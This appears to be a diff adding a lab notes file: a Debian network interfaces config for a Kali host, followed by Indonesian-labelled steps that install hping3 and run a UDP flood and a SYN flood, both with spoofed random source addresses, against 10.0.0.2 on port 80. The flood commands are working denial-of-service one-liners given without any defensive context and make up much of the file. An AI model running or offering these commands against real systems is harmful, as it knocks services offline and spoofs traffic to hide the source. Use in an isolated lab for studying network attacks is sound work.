@@ -1,0 +1,31 @@
+Edit config
+#
+# This is a sample network config, please uncomment lines to configure the network
+#
+
+# Uncomment this line to load custom interface files
+# source /etc/network/interfaces.d/*
+
+# Static config for eth1
+auto eth1
+iface eth1 inet static
+    address 10.0.0.1
+    netmask 255.255.255.252
+#	gateway 192.168.0.1
+#	up echo nameserver 192.168.0.1 > /etc/resolv.conf
+
+# DHCP config for eth0
+auto eth0
+iface eth0 inet dhcp
+#	hostname Kali-1
+
+instalasi hping3
+apt-get update
+apt-get install -y hping3
+
+
+udp flood
+hping3 --udp -p 80 --flood --rand-source 10.0.0.2
+
+syn flood
+hping3 -S -p 80 --flood --rand-source 10.0.0.2
